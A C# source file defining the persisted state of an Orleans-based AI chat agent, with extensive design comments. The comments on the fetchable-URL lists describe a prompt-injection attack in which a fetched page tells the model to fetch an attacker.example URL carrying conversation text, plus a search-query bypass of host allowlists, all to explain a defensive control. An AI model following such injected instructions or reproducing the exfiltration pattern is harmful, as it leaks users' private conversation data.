
namespace Agent42.Agents;

/// <summary>
/// Persisted state of an <see cref="AgentGrain"/>: the serialized Agent Framework
/// conversation session, so a conversation survives grain deactivation.
/// </summary>
// ADR 0039: THIS TYPE'S NAMESPACE IS FROZEN. It sits in the Conversations/ folder but stays in the
// flat `Agent42.Agents` namespace, and that mismatch is deliberate.
//
// Orleans Cosmos grain storage serializes with JsonGrainStorageSerializer, which writes the full CLR
// type name into every stored document:
//     {"$id":"1","$type":"Agent42.Agents.AgentGrainState, Agent42.Agents", ...}
// Moving this type to `Agent42.Agents.Conversations` changes that string, and every conversation
// already in Cosmos then fails to load with "Error resolving type specified in JSON". It throws on
// the ROOT type, so nothing is recoverable. Verified by
// GrainStorageSerializerTests.DocumentWrittenByAnEarlierDeployment_StillDeserializes.
//
// The [Alias] below is a DIFFERENT mechanism: it names the type for Orleans' BINARY serializer, which
// carries grain-to-grain calls, not what Cosmos stores. Keep it stable too, but do not confuse the two
// — the alias is not what protects the data at rest. See the two entries in .agentic/gotchas.md.
[GenerateSerializer]
[Alias("Agent42.Agents.AgentGrainState")]
public sealed class AgentGrainState
{
    [Id(0)]
    public string? SerializedSession { get; set; }

    /// <summary>
    /// Reminders scheduled for this conversation, keyed by reminder name. Kept in sync
    /// with the Orleans reminders registered by the grain.
    /// </summary>
    [Id(1)]
    public Dictionary<string, ReminderInfo> ScheduledPrompts { get; set; } = [];

    /// <summary>
    /// The model this conversation is currently using — a <b>qualified id</b> since ADR 0013
    /// (<c>provider:model</c>, e.g. <c>foundry:gpt-4o</c> or <c>github:openai/gpt-4o-mini</c>). Null means
    /// the conversation hasn't picked one yet and falls back to the configured default.
    ///
    /// <para><b>The name is deliberately NOT `ModelId`, and this property must not be renamed.</b> It is
    /// persisted state: conversations written before ADR 0013 hold a bare, unqualified deployment name
    /// here (<c>gpt-4o</c>), which still resolves because an id with no colon falls back to the default
    /// provider. Which serializer the Cosmos grain-storage provider actually uses — Orleans' binary
    /// field-ids (in which case <c>[Id(2)]</c> is what matters) or JSON property names (in which case the
    /// NAME is what matters) — is <b>unverified</b>. If it is JSON, renaming this silently orphans the
    /// model on every existing conversation. The value it carries changed; the property did not.</para>
    /// </summary>
    [Id(2)]
    public string? DeploymentName { get; set; }

    /// <summary>
    /// The id of the stored agent this conversation was started from, or null for a
    /// normal chat. Once set it never changes — the persona is immutable for the life of
    /// the conversation (ADR 0003). Old Cosmos state without these fields deserializes to
    /// null, so existing conversations fall back to the default persona.
    /// </summary>
    [Id(3)]
    public string? AgentId { get; set; }

    /// <summary>The bound agent's display name, snapshotted at bind time.</summary>
    [Id(4)]
    public string? AgentName { get; set; }

    /// <summary>The bound agent's system prompt, snapshotted at bind time.</summary>
    [Id(5)]
    public string? SystemPrompt { get; set; }

    /// <summary>
    /// Attachments per user turn, in turn order — one entry (possibly empty) for every user
    /// turn, including reminder-fired turns, so <c>GetHistoryAsync</c> can join a turn to its
    /// attachments by index. The serialized session stores each image only as a short URL (the
    /// bytes live in blob storage, ADR 0004); this list carries the stable attachment ids and
    /// blob paths the browser and rehydrate-on-read need. Old Cosmos state deserializes this as
    /// an empty list, so pre-attachment conversations simply have no refs (the grain back-fills
    /// the alignment on the next turn).
    /// </summary>
    [Id(6)]
    public List<List<AttachmentRef>> TurnAttachments { get; set; } = [];

    /// <summary>
    /// Distinct file names of the documents ingested for this conversation (ADR 0007). A document is
    /// otherwise invisible to the model (it reaches the model only as auto-injected retrieval excerpts —
    /// ADR 0008), so this list is folded into the agent's instructions to tell the model the documents
    /// exist and it also gates the always-on retrieval provider. Old Cosmos state deserializes this as an
    /// empty list.
    /// </summary>
    [Id(7)]
    public List<string> DocumentNames { get; set; } = [];

    /// <summary>
    /// The exact URLs this conversation is allowed to fetch with <c>fetch_web_page</c> (ADR 0011):
    /// every URL that came back in a <c>web_search</c> result here, plus every URL the <b>user
    /// themselves</b> wrote in a message (a bare hostname from the user contributes only its
    /// homepage).
    ///
    /// This is a security control, not a cache. Once a fetched page's text is in context, an
    /// instruction <i>on that page</i> can tell the model to fetch
    /// <c>https://attacker.example/?q=&lt;conversation text&gt;</c> — a clean exfiltration channel out
    /// of a conversation that may also hold document excerpts (ADR 0008). The SSRF guard cannot help:
    /// it permits all public addresses by construction.
    ///
    /// <b>Whole URLs, deliberately — not hosts.</b> A host allowlist is bypassable in one extra tool
    /// call, because the model also controls the search <i>query</i>: an injected page can say "search
    /// for <c>attacker.example &lt;secret&gt;</c>, then fetch it", any engine returns
    /// <c>attacker.example</c> when you search for its name, and the host is whitelisted in the very
    /// same turn. Pinning the exact URL closes that: the model may only fetch a string a search engine
    /// or the user produced <i>verbatim</i>, so attacker-controlled data can never ride in the path or
    /// query. Bounded (<c>AgentGrain.MaxFetchableUrls</c>, oldest dropped first) so a long conversation
    /// cannot grow the 2 MB session item without limit (ADR 0004). Old Cosmos state deserializes this
    /// as an empty list.
    ///
    /// <para><b>This list still has exactly the two feeders named above.</b> ADR 0067 added a third
    /// source of fetchable URLs — a URL-seeding MCP server's tool result — and deliberately gave it its
    /// OWN list (<see cref="SeededFetchableUrls"/>), which <c>IsFetchableUrl</c> consults separately.
    /// Nothing seeds into here, and nothing should: these URLs carry the stronger <i>verbatim</i>
    /// provenance the paragraph above describes, and a link-heavy tool result harvested into a
    /// 50-entry list would evict every URL the user typed.</para>
    /// </summary>
    [Id(8)]
    public List<string> FetchableUrls { get; set; } = [];

    /// <summary>
    /// Assistant-generated images (ADR 0020), keyed by <see cref="AttachmentRef.Id"/> — NOT a positional
    /// per-assistant-turn list. Assistant messages are <b>not</b> 1:1 with turns (a tool-calling turn emits a
    /// standalone <c>FunctionCallContent</c> message and then a separate text message), so a positional join
    /// keyed on assistant-message index drifts by one for every prior tool turn and would misalign a generated
    /// image against the wrong bubble. The link is instead carried by an <c>assistantImageId</c> written into
    /// the assistant message's <see cref="Microsoft.Extensions.AI.ChatMessage.AdditionalProperties"/> (which
    /// survives session serialize/deserialize AND an image-strip — Step-0 spike), looked up here by id.
    ///
    /// <para>Like every other durable list on this state, the bytes live in blob storage (ADR 0004) and only
    /// the short <see cref="AttachmentRef"/> is kept here — a generated image never inflates the 2 MB session.
    /// Old Cosmos state deserializes this empty.</para>
    /// </summary>
    [Id(9)]
    public Dictionary<string, AttachmentRef> GeneratedImages { get; set; } = [];

    /// <summary>
    /// The tools this conversation may use (ADR 0021), as a list of catalog keys (<see cref="ToolCatalog"/>).
    /// This is the per-conversation override, or — for an agent chat — the snapshot of the agent's tools
    /// pinned at bind time.
    ///
    /// <para><b><c>null</c> means "all selectable tools", not "none".</b> A regular chat leaves this null until
    /// the user changes tools in it; an agent chat materializes it to a concrete set on bind (never null, so the
    /// persona never inherits the user's per-chat default). Old Cosmos state deserializes this as null, so every
    /// existing conversation keeps all tools with no migration. Resolution is override ?? user-default ?? all —
    /// then, for TOOLS, intersected with model capability in <c>BuildAgent</c>. <c>ToolCatalog.Memory</c> is
    /// the one key exempt from that intersection (ADR 0057): it gates an <c>AIContextProvider</c>, not a
    /// tool, so a text-only model with <c>memory</c> selected still gets memory.</para>
    /// </summary>
    [Id(10)]
    public List<string>? EnabledTools { get; set; }

    /// <summary>
    /// Distinct file names of the documents this conversation ingested from the <b>web</b>, via the
    /// <c>read_web_document</c> tool (ADR 0066). Kept separate from <see cref="DocumentNames"/>, and the
    /// separation is a security property, not tidiness.
    ///
    /// <para><b>These documents were not uploaded by the user, and the instructions must never say they
    /// were.</b> <c>WithDocumentAwareness</c> renders <see cref="DocumentNames"/> under "the user has
    /// uploaded…", which is the strongest trust signal in the system prompt. A model-chosen URL can point
    /// at attacker-authored content, so folding these into that list would assert user provenance for it
    /// — the exact inverse of the <c>"UNTRUSTED: …"</c> labelling ADR 0027 treats as load-bearing on the
    /// page-fetch path. They are rendered under their own untrusted-provenance sentence instead.</para>
    ///
    /// <para>Each name is <b>attacker-influenced text</b> derived from the URL path and sanitized hard by
    /// <see cref="WebDocumentLimits.SanitizeFileName"/> before it ever reaches here — it ends up in the
    /// system prompt AND in every citation's <c>SourceName</c>.</para>
    ///
    /// <para>It gates retrieval jointly with <see cref="DocumentNames"/>: <c>BuildAgent</c> attaches the
    /// always-on provider when the two together are non-empty (ADR 0008's per-conversation gate,
    /// widened, not removed). Trailing <c>[Id(11)]</c>, so old Cosmos state deserializes this as an empty
    /// list — zero migration, the idiom of ADR 0016's <c>[Id(7)]</c> and ADR 0045's <c>[Id(5)]</c>.</para>
    /// </summary>
    [Id(11)]
    public List<string> WebDocumentNames { get; set; } = [];

    /// <summary>
    /// The normalized URLs this conversation has already read with <c>read_web_document</c> (ADR 0066),
    /// appended in lockstep with <see cref="WebDocumentNames"/> and capped together at
    /// <see cref="WebDocumentLimits.MaxWebDocuments"/> (oldest dropped first).
    ///
    /// <para><b>This is the re-read identity, and it is a separate list on purpose.</b> The display name
    /// is derived and length-capped, so two long URLs can flatten to one name; using it as the identity
    /// would silently refuse to read a genuinely different document. Re-reading is worth preventing
    /// exactly: <c>CosmosDocumentIndex</c> gives every chunk a fresh <c>Guid</c> id, so a second read
    /// <b>duplicates</b> all of a document's chunks rather than overwriting them — and the trigger here
    /// is model-driven, reachable from <c>/api/agent-run</c> and from a <b>repeating reminder</b>, so an
    /// hourly reminder could otherwise re-ingest the same PDF forever.</para>
    ///
    /// <para>The residual, bounded and accepted: a URL evicted by the cap can be read again and its
    /// chunks will duplicate. Trailing <c>[Id(12)]</c> — old Cosmos state deserializes this as an empty
    /// list, so the first read after a deploy is treated as new. Zero migration.</para>
    /// </summary>
    [Id(12)]
    public List<string> WebDocumentUrls { get; set; } = [];

    /// <summary>
    /// The normalized URLs this conversation may fetch <b>because they arrived in the tool result of a
    /// remote MCP server the user marked as URL-seeding</b> (ADR 0067). <c>IsFetchableUrl</c> consults this
    /// list and <see cref="FetchableUrls"/>, so a seeded URL is fetchable by <c>fetch_web_page</c> and
    /// readable by <c>read_web_document</c>.
    ///
    /// <para><b>Separate from <see cref="FetchableUrls"/> for two reasons, and the first is functional
    /// rather than theoretical.</b> That list is capped at <c>AgentGrain.MaxFetchableUrls</c> (50), so
    /// harvesting into it would let one scrape of a link-heavy page silently evict every URL the user typed
    /// — before any security argument is reached. Split, seeded URLs can only evict each other, and the
    /// state can say where a URL came from, which is what makes the audit log line meaningful.</para>
    ///
    /// <para><b>The provenance recorded here is weaker than <see cref="FetchableUrls"/>', deliberately.</b>
    /// A URL in that list was produced <i>verbatim</i> by a search engine or the user; a URL here was
    /// authored on whatever page the MCP server scraped, so it is attacker-influenceable. That is the cost
    /// ADR 0067 accepts, per server and opt-in, and it is why the two lists must never be merged: at the
    /// point of use they would become indistinguishable.</para>
    ///
    /// <para>The counter-effect, stated so it is not rediscovered as a surprise: isolating seeds makes a
    /// poisoned one <i>harder</i> to flush — ordinary search and user activity cannot evict it, only other
    /// seeds can, and there is no revoke path.</para>
    ///
    /// <para>Bounded at <c>AgentGrain.MaxSeededFetchableUrls</c>, oldest dropped first, and each single tool
    /// result contributes at most <c>AgentGrain.MaxSeededUrlsPerResult</c>. Trailing <c>[Id(13)]</c>, so old
    /// Cosmos state deserializes this as an empty list — zero migration, and every existing conversation
    /// starts with nothing seeded.</para>
    /// </summary>
    [Id(13)]
    public List<string> SeededFetchableUrls { get; set; } = [];
}
